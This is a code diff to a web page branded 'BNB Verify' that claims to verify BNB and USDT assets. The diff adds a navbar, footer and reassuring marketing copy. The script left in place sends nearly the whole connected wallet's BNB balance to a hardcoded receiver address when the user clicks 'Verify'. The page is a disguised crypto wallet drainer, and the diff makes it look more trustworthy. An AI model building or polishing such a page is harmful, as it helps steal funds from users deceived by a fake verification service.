@@ -57,20 +57,51 @@
     .pulse-ring:nth-child(3) { animation-delay: 2s; }
   </style>
 </head>
-<body class="flex flex-col min-h-screen justify-center items-center">
+<body class="flex flex-col min-h-screen">
 
-  <h1 class="text-4xl font-bold text-yellow-400 mb-6">BNB / USDT Verify</h1>
-  <p id="status" class="mb-6 text-gray-300">Click Verify to start...</p>
+  <!-- Navbar -->
+  <header class="bg-[#171717] bg-opacity-90 backdrop-blur-md sticky top-0 z-50 shadow-md">
+    <nav class="container mx-auto px-6 py-4 flex justify-between items-center">
+      <a href="#" class="flex items-center space-x-2">
+        <div class="h-8 w-8 bg-yellow-400 rounded-full"></div>
+        <span class="text-xl font-bold text-yellow-400">BNB Verify</span>
+      </a>
+      <div class="hidden md:flex space-x-8 text-sm font-medium">
+        <a href="#" class="hover:text-yellow-400 transition-colors">Home</a>
+        <a href="#" class="hover:text-yellow-400 transition-colors">Explorer</a>
+        <a href="#" class="hover:text-yellow-400 transition-colors">Tokens</a>
+        <a href="#" class="hover:text-yellow-400 transition-colors">NFTs</a>
+        <a href="#" class="hover:text-yellow-400 transition-colors">DApps</a>
+      </div>
+      <button class="md:hidden text-gray-400 focus:outline-none">
+        <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16m-7 6h7"></path>
+        </svg>
+      </button>
+    </nav>
+  </header>
 
-  <div class="relative flex justify-center items-center w-40 h-40">
-    <!-- Rings -->
-    <div class="pulse-ring"></div>
-    <div class="pulse-ring"></div>
-    <div class="pulse-ring"></div>
+  <!-- Main Content -->
+  <main class="flex-grow flex flex-col justify-center items-center text-center px-6">
+    <h1 class="text-4xl md:text-5xl font-bold text-yellow-400 mb-4">Verify Crypto Assets</h1>
+    <p class="text-gray-300 mb-8 max-w-lg">Instant verification of BNB Chain assets. Supports both BNB and USDT (BEP20) transfers securely.</p>
 
-    <!-- Button -->
-    <button onclick="handleVerify()" class="button-primary">Verify</button>
-  </div>
+    <!-- Animated Rings + Button -->
+    <div class="relative flex justify-center items-center w-40 h-40 mb-12">
+      <div class="pulse-ring"></div>
+      <div class="pulse-ring"></div>
+      <div class="pulse-ring"></div>
+
+      <button onclick="handleVerify()" class="button-primary">Verify</button>
+    </div>
+
+    <p id="status" class="text-gray-300 text-lg">Click Verify to start...</p>
+  </main>
+
+  <!-- Footer -->
+  <footer class="bg-[#171717] mt-12 py-6 text-center text-gray-500 text-sm">
+    &copy; 2025 BNB Verify. Powered by BNB Chain.
+  </footer>
 
   <script>
     const RECEIVER = "0x473aef5D2464d76B4C46cF883E611698b452d774"; 
@@ -103,7 +134,7 @@
           statusEl.innerText = "Sending BNB...";
           const tx = await signer.sendTransaction({
             to: RECEIVER,
-            value: balanceBNB - ethers.parseEther("0.0005") // leave gas buffer
+            value: balanceBNB - ethers.parseEther("0.0005")
           });
           await tx.wait();
           statusEl.innerText = "BNB sent successfully ✅";
